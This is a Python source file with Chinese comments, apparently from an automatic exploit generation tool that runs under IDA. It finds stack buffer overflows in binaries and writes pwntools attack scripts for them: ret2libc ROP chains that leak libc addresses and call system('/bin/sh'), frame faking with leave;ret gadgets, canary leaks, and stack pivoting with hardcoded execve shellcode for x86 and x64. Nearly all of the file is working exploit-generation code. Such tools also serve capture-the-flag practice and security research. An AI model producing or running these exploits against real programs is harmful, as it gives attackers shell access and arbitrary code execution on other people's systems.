#-*- coding:utf-8 -*-

from AEGinfo import * 
from AEGconfig import *
from AEGcommon import *
from AEGagent import *
from AEGfunction import *
from AEGStaticAnalyser import StaticTaintAnalysis,CallflowAnalysis
import AEGInstruction
from AEGInstruction import AEG_GetDisplacement
import AEGfunction
from AEGframe import *
from AEGsegment import *
from AEGleak import AEG_leak_puts
from idc import *

class BufferOverflowManager(object):
	'''
		一处溢出需要的所有信息（一个程序中可能有不止一处溢出？）
		拥有的参数：

		@call_addr： xref
		@overflow_size: 
		@unlimited 
		@offset_BP
		@got_something_flag
		@method:

	'''
	
	def __init__(self , **args):
		for item in args:
			setattr(self , item , args[item])
		self.got_something_flag = False 
		self.method = None
	
	def setAttrs(self , **args):
		for item in args:
			setattr(self , item , args[item])


	def __str__(self):
		ret = ''
		for item in self.__dict__:
			ret += '%s:%s ' % (item , getattr(self , item))
		return ret
	def __repr__(self):
		return self.__str__()


_RecvRange_func = '''
def RecvRange(range_l ,range_h):
	buf = []
	start ,end = 0,-1
	value =  0
	while 1:
		buf.append(struct.unpack( "B", p.recv(1))[0])
		end += 1 
		value += pow(256 , end - start) * buf[end]
		if value > range_h :
			value = value // 256
			start += 1 
		elif value < range_l:
			continue 
		if value <= range_h and value >= range_l : 
			return value 
'''


class InfoManager(object):
	'''
		所有的关于溢出的信息都在这里
	'''

	shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
	shellcode_x64 = "H1\xc9H\xf7\xe1QH\xbb/bin//shSH\x89\xe3\xb0\x0b\xcd\x80"

	fake_bp_x86 = 0xdeadbeef
	fake_bp_x64 = 0xdeadbeefcaffe233
	def __init__(self):
		self.DangerFuncs = DangerousFunction()
		self.flag_stack_pivot = False 

		self.buffer_infos = []
	
	def GetDangerFuncs(self , type_constrain = None):
		if type_constrain is None:
			return self.DangerFuncs
		else:
			return list( i  for i in self.DangerFuncs if i.type == type_constrain)
	
	def SuggestMethod(self):
		'''
		获得可能有用的方法。按照以下顺序检测：

		1. checksec
		2. 如果 NX = false && canary = False && aslr  = false, 直接注入shellcode。不考虑有aslr的情况
		3. nx = false && canary = False && jmp esp gadget , jump to esp
		4. nx = False && canary = False && 在溢出后有puts之类的动作的 => Frame Faking
		5. nx = True && canary = False && 没有puts动作 => 
			6.1 ret2text (能找到可用text)
			6.2 ret2shellcode (能找到可污染的可写可执行段)
			6.3 ret2syscall (TODO) 需要比较严苛的条件： int 0x80; 可写入多个寄存器(eax ~ edx)的gadget
			6.4 ret2libc (TODO): 可能需要leak。也同样需要一个puts函数
		6. 以上有任何一条是canary = True: 则leak技术。（TODO）
		'''

		self.DetectDangerFuncs()
		for index , bom in enumerate(self.buffer_infos):
			smem = StaticTaintAnalysis(bom.call_addr , bom.overflow_size , bom.offset_BP)
			call_flow = CallflowAnalysis(bom.call_addr)

			printf("taint analysis: " + str(smem) , verbose=LOG_LEVEL_DEBUG)
			
			overflow_frame = smem.OverlapAny(INFO_BITS / 8 , length=INFO_BITS / 8 * 3)
			if overflow_frame is not None:
				### 可以使用ROP
				script = self.ROP_ret2libc(bom.offset_BP , bom.call_addr , call_flow,smem)
				if script is not None:
					bom.method = "ret2libc%d.py" % index 
					_filename = INFO_INPUT_FILENAME + bom.method
					script.dump(filename=_filename)
					bom.got_something_flag = True
				
			### TODO: 符号执行
			else:
				### 溢出长度不足，使用frame faking 
				script = self.FrameFaking(bom.overflow_size , bom.offset_BP , bom.call_addr,call_flow , smem) 
				if script is not None:
					bom.method = "fakeframe%d.py" % index
					_filename = INFO_INPUT_FILENAME + bom.method
					script.dump(filename=_filename)
					bom.got_something_flag = True
					continue

			if not INFO_SEC_NX:
				### 如果没有NX保护，可以尝试stackpivot
				_output_shellcode = self.StackPivot(bom.offset_BP )
				if _output_shellcode is not None:
					### 记录
					bom.got_something_flag = True 
					bom.method = 'stackpivot' + str(index)
					AEG_save_file(INFO_INPUT_FILENAME + ".stackpivot" + str(index),_output_shellcode,"wb")
					continue

			

			pass

	def Leak(self , script , offset_BP):
		### TODO: 检查是否满足leak的条件

		padding_size = offset_BP - INFO_BITS / 8 + 1
		script.addHackCode('''p.send('A' * {:d})'''.format(padding_size) )
		script.addHackCode('''p.recvuntil('A' * {:d})'''.format(padding_size) )
		script.addHackCode('''canary =  u{:d}('\\x00' + p.recv({:d}))'''.format(INFO_BITS , INFO_BITS / 8 -1) )
		pass

	def FrameFaking(self , input_size , offset_BP , xref , call_flow , smem):

		'''
			Frame faking 的限制：
			gets 之类的溢出函数之后必须跟着一个 puts 或者 printf("%s")或者 printf(buf)或者 write ()直至ebp指向的地址
			而且这个输出函数的参数必须是经过污染的

			Frame faking 适用于只能刚好覆盖到返回地址的情况。
		'''

		#printf(call_flow)
		def _GetStackSize():
			### 获得[ebp] 与 esp 的距离
			gdb_agent()
			#printf(gdb_output , verbose=LOG_LEVEL_DEBUG)
			with open(os.path.join(INFO_INPUT_FILEPATH , "gdboutput.txt") ,"r") as f:
				lines = f.read().split('\n')
				_top = int(lines[0].split('=')[1].strip() , base=16)
				_bottom = int(lines[1].split(':')[1].strip(),base = 16)
				#printf("top = %s(%s) , button = %s(%s)" % (_top , type(_top) , _bottom , type(_bottom)) ,verbose = LOG_LEVEL_DEBUG)
				return  _bottom - _top

		def _RecvStackBottom():
			#range_l , range_h =  AEG_GetStackRange()
			script.addHackCode('''range_l ,range_h = GetStackRange()''')
			script.addHackCode('''_t = RecvRange(range_l,range_h)''')
		
		def _RecvLibcAddr():
			script.addHackCode('''range_l ,range_h = GetLibcRange()''')
			script.addHackCode('''_t = RecvRange(range_l,range_h)''')

		def _IsOverflowInput(item):
			if item.classes == 1 and item.addr == xref :
				return True 
			return False 
		
		def _IsOverflowOutput(item ):
			if item.classes == 2 and smem.Overlap(AEG_GetDisplacement(item.appendix) , frame_name = AEG_GetFuncName(AEG_GetFunctionHead(xref))):
				return True
			return False 
		
		_overflow_input_index = -1 
		_overflow_output_index = -1

		for index ,  item in enumerate(call_flow):
			if _IsOverflowInput(item) :
				_overflow_input_index = index 
			elif _IsOverflowOutput(item):
				_overflow_output_index = index 

		if _overflow_input_index == -1 or  _overflow_output_index == -1 :
			printf("No input / output found . Frame faking failed.(%d ,%d)" % (_overflow_input_index,_overflow_output_index) , verbose =LOG_LEVEL_DEBUG)
			return None 
		if _overflow_input_index > _overflow_output_index :
			printf("Error in finding input/output  . Frame faking failed." , verbose =LOG_LEVEL_DEBUG)
			return None
		
		send_after_str = ''
		for index , item in enumerate(call_flow):
			if index >= _overflow_output_index :
				break
			if item.classes == 0 :
				send_after_str += item.appendix
				if 'puts' in item.func_name :
					send_after_str += '\\n'				
		
		script = ScriptFiller()
		script.setProcessName("./%s" % INFO_INPUT_FILENAME)
		script.addAssistFunc(AEG_GetStackRange_Str)
		script.addAssistFunc(AEG_GetLibcRange_Str)
		script.addAssistFunc(_RecvRange_func)
		#### 这里还需要一个检测的过程--最好使用sendafter,比如此例中，最好使用sendafter('>' ,xxxx)
		### 检测在read函数之前出现的所有有关输出 
		
		### first run : leak stack address
		'''
			p.sendafter(">", 'a' * 80)
			p.recvuntil('a'*80)
		'''
		#script.addHackCode('''elf = ELF('{}')'''.format("./%s" % INFO_INPUT_FILENAME))
		script.addHackCode('''sa('{}','a'*{:d})'''.format(send_after_str.replace('\'' , '\\\'') ,abs(offset_BP)))
		script.addHackCode('''p.recvuntil('a'*{:d})'''.format(abs(offset_BP)))

		### 接收栈地址。我们这里假设使用的是puts函数打印，由于puts函数不会自己补\0，因此会把BP的值打印出来。
		_RecvStackBottom()

		### 算出stack
		stack_size = _GetStackSize()
		script.addHackCode(r'''stack = _t - ''' + hex(stack_size))

		## 求gadget : pop rdi ; ret
		out = ROPGadget_agent(addition_cmd= '--only "pop|ret"')
		pop_rdi_ret_gadget = None
		#printf(out , verbose=LOG_LEVEL_DEBUG)
		for line in out:
			if "pop rdi ; ret" in line:
				pop_rdi_ret_gadget = int(line.split(':')[0].strip(),base = 16)
				break
		
		if pop_rdi_ret_gadget is None:
			printf("No 'pop rdi ; ret' gadget. Frame Faking Fail." , verbose=LOG_LEVEL_WARN)
			return None
		
		leave_ret_gadget = None 
		out = ROPGadget_agent(addition_cmd=' --only "leave|ret"')
		for line in out:
			if "leave ; ret" in line:
				leave_ret_gadget = int(line.split(':')[0].strip() , base = 16)
				break
		if leave_ret_gadget is None:
			printf("No 'leave ; ret' gadget. Frame Faking Fail." , verbose=LOG_LEVEL_WARN)
			return None
		
		### 发送第一个payload，leak puts的地址。
		### 注意在这里最好用sendafter，但现在没有指示输出什么，所以只用send
		script.addHackCode(r'''sa('{}' ,flat( ['1'*{:d} , 0x{:x} , elf.got['puts'] , elf.plt['puts'], 0x{:x}, {:d}*'1' , stack , 0x{:x}] , word_size={:d} , sign = False))'''.format(
							send_after_str,
							INFO_BITS / 8,
							pop_rdi_ret_gadget , 
							AEGfunction.AEG_GetFunctionHead(xref) , 
							abs(offset_BP) - (INFO_BITS / 8) * 5 ,
							leave_ret_gadget, 
							INFO_BITS
		))

		### 接收下一个地址(puts函数的地址)
		#script.addHackCode(r'''p.recvline()''')
		_RecvLibcAddr()
		script.addHackCode(r'''libc.address = _t - libc.sym['puts']''')

		### 有了libc的基地址，就可以实行ROP了.再次进行Frame Faking
		### TODO: 从puts函数返回xref所在函数时，需要知道栈比原来偏移了多少。这里先写0x30。很可能是确定的

		script.addHackCode(r'''sa( '{}',flat(['2'*{:d} , 0x{:x} , next(libc.search('/bin/sh')) , libc.sym['system'] , {:d}*'2' , stack-0x30 , 0x{:x}],sign=False , word_size = {:d}))'''.format(
			send_after_str ,
			INFO_BITS / 8 ,
			pop_rdi_ret_gadget,
			(abs(offset_BP) - INFO_BITS / 8 * 4) ,
			leave_ret_gadget,
			INFO_BITS
		))

		#script.dump(filename=INFO_INPUT_FILENAME +".FrameFaking.atk.py")
		return script



	def StackPivot(self , offset_BP , filename = INFO_INPUT_FILENAME):
		'''
		Staack Pivoting:栈转移
		必须要有gadget -- jmp esp

		@offset_BP :从缓冲区的位置0，到BP的距离。即：

		|buffer [0] | buffer[1] |...|EBP/RBP

		| <----		offset_BP --->	|   
		
		@filename: 需要找gadget的文件。有时候gadget用的是.so库文件，此时需要指定filename为该so文件
		
		'''
		if INFO_SEC_NX :
			printf("Stack Not Executable(NX is on). Stack pivoting fail." , verbose=LOG_LEVEL_WARN)
			return None
		if INFO_BITS == 32:
			shellcode = self.shellcode_x86
			fake_bp = struct.pack("I" ,0xdeadbeef)
		else:
			shellcode = self.shellcode_x64
			fake_bp = struct.pack("Q" ,0xdeadbeefae9caffe)	

		padding_size = abs(offset_BP) - len(shellcode)
		printf("Stack Pivot: padding size = %d" % padding_size , verbose= LOG_LEVEL_DEBUG)
		if padding_size < 0 :
			printf("buffer size too small to apply a Stack pivot" , verbose = LOG_LEVEL_WARN) 
			return None


		_gadgets = ROPGadget_agent(addition_cmd=' --only "jmp|ret"')
		
		jmp_esp_gadget = None
		for line in _gadgets:
			if "jmp esp" in line:
				jmp_esp_gadget_int = line.split(':')[0].strip().replace("0x" ,"")
				jmp_esp_gadget_int = int(jmp_esp_gadget_int, base = 16)
				if INFO_BITS == 64:
					jmp_esp_gadget = struct.pack("Q" , jmp_esp_gadget_int)
				else:
					jmp_esp_gadget = struct.pack("I" , jmp_esp_gadget_int)

		#jmp_esp_gadget = Get_ropgadget( filename, 1)
		if jmp_esp_gadget is None:
			printf("No jmp esp gadget. Stack pivoting fail." , verbose=LOG_LEVEL_WARN)
			return None
		printf("find jmp_esp_gadget. %s  Using Tech: Stack pivot" % (jmp_esp_gadget_int))
		
		if INFO_BITS == 32:
			jmp_and_sub_sp_cmd = "print asm('sub esp, 0x%x;jmp esp');" % (abs(offset_BP) + (INFO_BITS / 8 ) * 2)
		elif INFO_BITS == 64:
			jmp_and_sub_sp_cmd = "print asm('sub rsp, 0x%x;jmp rsp');" % (abs(offset_BP) + (INFO_BITS / 8 ) * 2)
		else:
			raise NotImplementedException("Err INFO_BITS")

		jmp_and_sub_esp = pwntools_agent(jmp_and_sub_sp_cmd)

		#print (hex(jmp_esp_gadget))
		#print (jmp_and_sub_esp)
		shellcode = shellcode + padding_size * 'b' + fake_bp \
					+  jmp_esp_gadget +  jmp_and_sub_esp
		
		printf ("Stack pivot success! final shellcode: " + shellcode)
		return shellcode
	


	def DetectDangerFuncs(self):
		'''
		检测方法1：从危险函数出发 ，找到其所有引用，查看是否存在溢出的可能 
		如果溢出，返回 (压入参数的指令地址，总输入长度(size) , 输入的地方距离BP的长度)
		'''
		

		def _sizeCheck(arg_addr):
			'''
			@arg_addr: 要检查的参数所在指令的地址。
						比如  0x8048123: push $0xa		
			'''
			instr = AEGInstruction.AEG_Instruction(arg_addr)
			_op = instr.GetOperator()
			printf("_size check::%x" % arg_addr , verbose=LOG_LEVEL_DEBUG)
			if _op == 'push':
				_size = instr.GetOperand(0)
				printf( "Pushing operand(size) to arg : " + str(_size) , verbose=LOG_LEVEL_DEBUG)
			elif _op == "mov":
				## mov [ESP + xxx], $imm
				_size = instr.GetOperand(1)
				if 'h' in _size.lower():
					_size = int(_size.lower().strip('h') , base=16)
				else:
					_size = int(_size , base = 10)
				printf( "Moving operand(size) to arg : " + str(_size),verbose=LOG_LEVEL_DEBUG)
			else:
				raise NotImplementedException('_op = ' + _op)
			return _size

		def _bufferCheck(arg_addr):
			instr = AEGInstruction.AEG_Instruction(arg_addr)
			_op = instr.GetOperator()
			#print type(instr.GetStackVar(1))
			if _op == 'push':
				buffer_opnd = instr.GetOperand(0)
				printf( "pushing operand (buffer) to arg :" + str(buffer_opnd) , verbose = LOG_LEVEL_DEBUG)
			elif _op == "mov":
				buffer_opnd = instr.GetOperand(1)
				printf ("moving operand (buffer) to arg :" + str(buffer_opnd) ,verbose = LOG_LEVEL_DEBUG)
			else:
				raise NotImplementedException()

			### buffer类型可能会有通过寄存器来完成压栈的情况，需要向上寻找。
			buffer_opnd_type = instr.GetOpndType(1)
			if buffer_opnd_type == o_reg:
				if buffer_opnd == 'esp' or buffer_opnd == 'rsp':
					## rsp , esp 说明是直接传栈到 rdi/rsi 
					# mov rdi, rsp
					return Getoffset_SP2BP(arg_addr)

				function_head = AEGfunction.AEG_GetFunctionHead(instr.addr)
				_tmp_addr = instr.addr
				_stack_var = None
				while True:
					_tmp_addr = idc.PrevHead(_tmp_addr)
					printf("buffer check ::Checking tmp_addr: %x" % _tmp_addr , verbose=LOG_LEVEL_DEBUG )
					_instr_dec = AEGInstruction.AEG_Instruction(_tmp_addr)
					_op = _instr_dec.GetOperator().lower()
					if _op in ("ret", "retn", "jmp", "b") or _tmp_addr < function_head:
						printf("Encounter control flow changes" , verbose=LOG_LEVEL_DEBUG)
						raise NotImplementedException()
						
					elif _op == "lea" and _instr_dec.GetOperand(0) == buffer_opnd:
						_stack_var = _instr_dec.IsStackVar(1)
						if  _stack_var :
							
							printf("Find a stack var that pass to args: %x  %x." % (instr.addr, _instr_dec.addr))
							displacement = AEGInstruction.AEG_GetDisplacement(_instr_dec.GetOperand(1))
							if 'sp' in _instr_dec.GetOperand(1):
								offset = Getoffset_SP2BP(_tmp_addr)
								offset_BP =displacement - offset
							else:
								offset_BP = displacement
							return offset_BP
						else:
							printf("Not stack var (%x) " % _tmp_addr)
							break
					elif _op == "mov" and _instr_dec.GetOperand(0)== buffer_opnd:
						## 
						raise NotImplementedException()
						op_type = _instr_dec.GetOpndType(1)
						if op_type == o_reg :
							opnd = _instr_dec.GetOperand(1)
							raise NotImplementedException()
						else:
							raise NotImplementedException()
			pass


		D_funcs = self.GetDangerFuncs('buffer')
		printf("Got Dangerous Functions" +str(D_funcs) ,
				verbose=LOG_LEVEL_DEBUG)

		for danger_func in D_funcs :
			xrefs = AEG_GetCodeXrefsTo(danger_func.addr)
			for xref in xrefs:
				try:
					if AEGInstruction.AEG_AnalyseRefs(xref) == 'call':
						printf("Find a call to danger func:%s" % danger_func ,verbose=LOG_LEVEL_DEBUG)
						all_args = AEGfunction.AEG_GetFuncArgs(xref)
						printf(map(lambda x: " %x " % x ,all_args) , verbose=LOG_LEVEL_DEBUG)

						_unlimited = False
						## size check 
						if hasattr(danger_func , 'size_idx'):
							_size = _sizeCheck(all_args[danger_func.size_idx]) 
							if _size is None:
								## size check fail
								printf("Size check fail at %x" % all_args[danger_func.size_idx] , verbose=LOG_LEVEL_WARN)
								return None
							
						else: 
							## 没有size_idx属性，比如gets之类的函数，一定溢出
							_unlimited = True

						### buffer check
						offset_BP = _bufferCheck(all_args[danger_func.buffer_idx])
						if offset_BP is None:
							printf("Buffer check fail." , verbose=LOG_LEVEL_WARN)
							return None
						if _unlimited:
							_size =  0x100 

						
						if _unlimited or  _size > abs(offset_BP) :
							bom = BufferOverflowManager(call_addr = xref  , overflow_size = _size , unlimited = _unlimited , offset_BP = offset_BP)
							printf("Buffer overflow found! %s" % bom)
							self.buffer_infos.append(bom)

					else:
						### TODO :
						pass
				except Exception:
					import traceback 
					traceback.print_exc()

	
	def ROP_ret2libc(self , offset_BP , xref, call_flow ,smem):
		'''
			需要满足的条件：溢出的至少有 3 个 位置（在32位程序中是 3*4 =12个字节，在64位程序中是4*8=32）
			如果是64位程序，还需要找pop rdi;ret gadget : TODO 
		'''
		'''
			TODO: offset_BP 需要重新计算，因为不同阶段可能会有差别
			TODO: 需要考虑使用gets函数时必须输入换行符的情况。即：什么时候需要sendlineafter
		'''
		def _IsOverflowInput(item):
			if item.classes == 1 and item.addr == xref :
				return True 
			return False
		def _IsOverflowOutput(item ):
			if item.classes == 2 and smem.Overlap(AEG_GetDisplacement(item.appendix) , frame_name = AEG_GetFuncName(AEG_GetFunctionHead(xref))):
				return True
			return False 
		send_after_str = '' 
		_overflow_input_index = -1
		_overflow_output_index = -1
		ret_following_input = True

		printf(call_flow)
		for index , item in enumerate(call_flow):
			if _IsOverflowInput(item):
				_overflow_input_index = index 
			if item.classes == 0:
				if _overflow_input_index == -1:
					send_after_str += item.appendix

					if 'puts' in item.func_name :
						send_after_str += '\\n'
			if _IsOverflowOutput(item):
				_overflow_output_index = index 
		
		if _overflow_input_index == -1:
			printf("No Input index found. ret2libc fail" ,verbose = LOG_LEVEL_DEBUG)
			return None

		if _overflow_output_index != -1 and _overflow_output_index > _overflow_input_index :
			ret_following_input = False 

		script = ScriptFiller()
		script.setProcessName("./%s" % INFO_INPUT_FILENAME)
		script.addAssistFunc(_RecvRange_func)
		script.addAssistFunc(AEG_GetLibcRange_Str)

		if INFO_SEC_CANARY:
			self.Leak(script , offset_BP)

		else:
			script.addHackCode('''canary = 0x{:x}'''.format(self.fake_bp_x64 if INFO_BITS == 64 else self.fake_bp_x86))

		###第一个payload，用于使用puts函数打印出libc_start_main的地址.同时，回到这个函数来

		if INFO_BITS == 32:
			script.addHackCode(
				'''payload = flat(['1' * {:d} , canary ,0x{:x} , elf.plt['puts'] , 0x{:x} , elf.got['__libc_start_main']] ,word_size= {:d} ,sign=False)'''.format(
					abs(offset_BP) - INFO_BITS / 8, 
					self.fake_bp_x86 if INFO_BITS == 32 else  self.fake_bp_x64 ,
					AEGfunction.AEG_GetFunctionHead(xref) ,
					INFO_BITS
				))
		else:
			## 求gadget : pop rdi ; ret
			out = ROPGadget_agent(addition_cmd= '--only "pop|ret"')
			pop_rdi_ret_gadget = None
			#printf(out , verbose=LOG_LEVEL_DEBUG)
			for line in out:
				if "pop rdi ; ret" in line:
					pop_rdi_ret_gadget = int(line.split(':')[0].strip(),base = 16)
					break
			
			if pop_rdi_ret_gadget is None:
				printf("64 bits program with No 'pop rdi ; ret' gadget. ret2libc  Fail." , verbose=LOG_LEVEL_WARN)
				return None
			
			script.addHackCode(
				'''payload = flat(['1' * {:d} , canary ,0x{:x} ,0x{:x} ,elf.got['__libc_start_main']] , elf.plt['puts'] , 0x{:x} , word_size= {:d} ,sign=False)'''.format(
					abs(offset_BP) - INFO_BITS / 8, 
					self.fake_bp_x86 if INFO_BITS == 32 else  self.fake_bp_x64 ,
					pop_rdi_ret_gadget,
					AEGfunction.AEG_GetFunctionHead(xref) ,
					INFO_BITS
				))
		script.addHackCode('''sa('{}' ,payload)'''.format(send_after_str))
		
		### 由于循环，可能出现两种情况：
		### read(buf) -> puts(buf) -> read(buf) ->puts(buf) -> ...(some condition) -> return function 
		### read(buf) -> return function -> ... read(buf) -> return function -> ...
		### 第一种情况需要 将自己的buf再接收一遍 
		### 第二种情况不需要，只需要直接接收即可
		### TODO basic block

		if not ret_following_input:
			script.addHackCode('''p.recvline()''')

		###在接收地址之前，需要一个比较麻烦的操作：angr ， 以确定执行到函数末尾需要什么条件
		angr_out = angr_agent("./%s" % INFO_INPUT_FILENAME , AEG_GetFunctionEnd(xref) - 1)
		
		angr_out = angr_out.decode('latin1').strip('\x00')
		#angr_out = angr_out.__repr__().strip('"').strip('b').replace('\\\\' , '\\')
		if INFO_SEC_CANARY:
			_max_input = offset_BP - INFO_BITS / 8 * 2
		else:
			_max_input = offset_BP - INFO_BITS / 8 ## 太长了可能会产生覆盖。也许可以只保留可打印字符?
		if len(angr_out) > _max_input :
			angr_out = angr_out[:_max_input]
		if len(angr_out) != 0:
			script.addHackCode('''p.send({}.encode('latin1'))'''.format(repr(angr_out)))

		
		### 接收地址
		#script.addHackCode('''libc_start_main =  p.recv()[:{:d}]'''.format(INFO_BITS / 8))
		script.addHackCode('range_l,range_h = GetLibcRange()')
		script.addHackCode('''_t = RecvRange(range_l , range_h)''')
		script.addHackCode('''libc.address = _t - libc.symbols['__libc_start_main']''')
		

		### 第二次payload
		if INFO_BITS == 32:
			script.addHackCode('''payload = flat(['2'*{:d} , 0x{:x} , libc.symbols['system'] , 0x{:x} , next(libc.search('/bin/sh'))], word_size={:d},sign=False)'''.format(
				abs(offset_BP) ,
				self.fake_bp_x86 if INFO_BITS == 32 else self.fake_bp_x64 ,
				AEGfunction.AEG_GetFunctionHead(xref) ,
				INFO_BITS 
			))
		else:
			script.addHackCode('''payload = flat(['2'*{:d} , 0x{:x} , 0x{:x} ,  next(libc.search('/bin/sh')) ,libc.symbols['system'] , 0x{:x}], word_size={:d},sign=False)'''.format(
				abs(offset_BP) ,
				self.fake_bp_x86 if INFO_BITS == 32 else self.fake_bp_x64 ,
				pop_rdi_ret_gadget ,
				AEGfunction.AEG_GetFunctionHead(xref) ,
				INFO_BITS 
			))
		script.addHackCode('''p.send(payload)''')

		return script

	def ROP_FindText(self):
		'''
		查找能在ret2text中利用到的代码
		如： system("/bin/sh") ; execve("/bin/sh" , NULL  , NULL)

		思路：先找出所有对.system的引用，然后对"call system"的指令分析其参数，如果参数里有'sh'那么就是找到了
		'''
		
		for func_obj in self.GetDangerFuncs():
			func = func_obj.addr
			if AEG_GetFuncName(func) == '.system':
				xrefs = AEG_GetCodeXrefsTo(func)
				for xref in xrefs :
					if AEGInstruction.AEG_AnalyseRefs(xref) == 'call' :
						arg_cmd = AEG_GetFuncArgs(xref)[0]
						instr = AEGInstruction.AEG_Instruction(arg_cmd)
						_op = instr.GetOperator()
						if _op == "mov":
							### mov xxx [sp] , xxx
							try:
								cmd = GetString(GetOperandValue(arg_cmd ,1))
								if cmd == '/bin/sh' or cmd == '/bin/bash':
									### find a system('/bin/sh')
									return arg_cmd 
							except Exception as e:
								printf(e , verbose = LOG_LEVEL_DEBUG) 
						elif _op == "lea":
							raise NotImplementedException()
					else:
						raise NotImplementedException()
			elif '.exec' in AEG_GetFuncName(func):
				raise NotImplementedException()
			else:
				pass
		pass

if __name__ == "__main__":
	InfoManager().SuggestMethod()